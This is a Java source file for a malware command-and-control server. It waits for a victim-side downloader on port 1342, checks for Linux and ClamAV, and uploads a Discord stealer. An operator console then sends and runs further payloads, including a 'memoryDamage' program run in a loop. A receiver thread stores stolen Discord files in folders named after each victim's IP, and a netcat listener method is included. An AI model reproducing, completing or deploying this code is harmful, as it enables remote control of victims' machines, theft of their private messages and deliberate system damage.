import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Scanner;
import static java.lang.System.exit;
/** * malwareServer */
public class malwareServer {
    static public ServerSocket server;

    static {
        try {
            server = new ServerSocket(1342);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public malwareServer() {
    }

    public static void main(String[] args) throws Exception {

        Socket socket = server.accept();
        Scanner scanner = new Scanner(System.in);
        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream());
        String line;

        //checking if its linux
        line = reader.readLine();
        if (line.toLowerCase().trim().equals("not linux")) {
            System.out.println("not linux system...");
            System.out.println("quiting...");
            exit(0);
        }
        System.out.println("downloader connected from: " + socket.getRemoteSocketAddress() + " successfully!!!"); //checks if antivirus is installed
        System.out.println("victim has linux installed!!!");
        
        // make a directory with the IP name
        CreateDirct(String.valueOf(socket.getInetAddress()));

        //checking if antivirus is installed
        line = reader.readLine();
        if (line.toLowerCase().trim().equals("has av")) {
            System.out.println("HAS CLAM AV INSTALLED!!!");
        } else {
            System.out.println("NO ANTIVIRUS IS INSTALLED!!!");
        }

        //receiving OS version
        line = reader.readLine();
        System.out.println("OS version is: " + line + "...");

        //uploads discord stealer
        line = reader.readLine();
        if (!line.toLowerCase().trim().equals("has discord")) {
            System.out.println("victim doesn't have discord installed :(");
        } else {
            System.out.println("sending discord malware...");
            uploadMalware(socket, "discord.java");
            line = reader.readLine();
            if (line.toLowerCase().trim().equals("received discord malware")) {
                System.out.println("uploaded discord malware successfully...");
            }
        }
        //command and control starts
        String cc = " ";
        ArrayList<String> downloaded = new ArrayList<>(Collections.singleton("discord.java"));
        while(!cc.equals("quit")){
            System.out.print("-------->");
            cc = scanner.nextLine();
            String[] parsed = cc.split(" ");
            cc = parsed[0];
            if(cc.trim().equals("list")){
                String[] command = {"ls", "malwares/"};
                Process processes = Runtime.getRuntime().exec(command);
                BufferedReader read = new BufferedReader(new InputStreamReader(processes.getInputStream()));
                while ((line = read.readLine()) != null) {
                    System.out.println(line);
                }
            }

            else if(cc.trim().equals("send")){
                cc = parsed[1];
                System.out.println("uploading " + cc + "...");
                writer.println("send");
                writer.println(cc);
                writer.flush();
                uploadMalware(socket, cc);
                System.out.println("uploaded " + cc + " successfully!!!");
                downloaded.add(cc);
            }

            else if (cc.trim().equals("downloaded")) {
                for (String malware : downloaded) {
                    System.out.println(malware);
                }
            }
            else if(cc.trim().equals("bot")){
                String command = "";
                writer.println("you'r a bot");
                writer.flush();
                
            }
            else if(cc.trim().equals("run")){
                cc = parsed[1];
                System.out.println("running " + cc + "...");
                runMalware(socket, cc);
                System.out.println("ran " + cc + " successfully!!!");
            }else{
                System.out.println("unrecognized Command");
            }

        }
        scanner.close();
        socket.close();
        server.close();
    }
    static void uploadMalware(Socket socket, String name) throws Exception {
        FileInputStream fileIn = new FileInputStream("malwares/"+name);
        BufferedOutputStream out = new BufferedOutputStream(socket.getOutputStream());
        int c;
        while ((c = fileIn.read()) != -1) {
            out.write(c);
        }
        out.write(255);
        out.flush();
        fileIn.close();
    }
    static void runMalware(Socket socket, String malware) throws Exception {
        PrintWriter writer = new PrintWriter(socket.getOutputStream());
        writer.println("run");
        writer.flush();

        writer.println(malware);
        writer.flush();

        // just for the malwares that send back data
        if(malware.equals("discord.java")){
            Socket socket1 = server.accept();
            DiscordRec rec = new DiscordRec(socket1);
            Thread th = new Thread(rec);
            th.start();
        }

        //just for memoryDamage malware, where we constantly keep running it
        if(malware.equals("memoryDamage.java")){
            for(int i=0; i<10; i++){
                writer.println("run");
                writer.flush();
                writer.println(malware);
                writer.flush();
            }
        }

    }
    static void CreateDirct(String IP){
        File dir = new File(IP.substring(1));
        dir.mkdir();
    }

    static void netCatSession(Socket socket) throws IOException {
        //old way with java executing code
        // BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        // String rec;
        // while(!(rec = reader.readLine()).equals("end of command is here blah blah blah")){
        //     System.out.println(rec);
        // }
        int port = 4444; // Port to listen on

        try {
            // Create a process builder for the Netcat listener command
            ProcessBuilder processBuilder = new ProcessBuilder("/usr/bin/nc", "-l", "-p", Integer.toString(port));

            // Start the process
            Process process = processBuilder.start();

            // Wait for the listener to start
            Thread.sleep(2000);

            
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}

class DiscordRec implements Runnable{
    Socket socket;
    DiscordRec(Socket socket){
        this.socket = socket;
    }
    @Override
    public void run() {
        System.out.println("discord.java is connected...");
        try {
                //receive name of the file
                BufferedInputStream input = new BufferedInputStream(socket.getInputStream());
                
                while (true) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                String line = reader.readLine();

                
                if(line.trim().equals("all files has been copied"))
                    break;
                String [] linee = line.split("/", 8);
                line = linee[linee.length-1];
                String name = System.getProperty("user.dir")+socket.getInetAddress().toString() + "/" + line; // IP(folderName)/fileName
                System.out.println("copying " + line + "...");
                File file = new File(name);
                file.createNewFile();

                //receiving the file
                BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(name));
                int c;  
                while ((c = input.read()) != 255) {
                    out.write(c);
                }
                System.out.println("Copied " + line + " to " + name + "...");
                PrintWriter writer = new PrintWriter(socket.getOutputStream());
                writer.println("finished");
                writer.flush();
                out.close();

            }
            System.out.println("finished downloading discord chat...");
            System.out.println("-------->");
        } catch(IOException e){
            throw new RuntimeException(e);
        } catch(Exception ex){
            ex.printStackTrace();
        }
    }


}         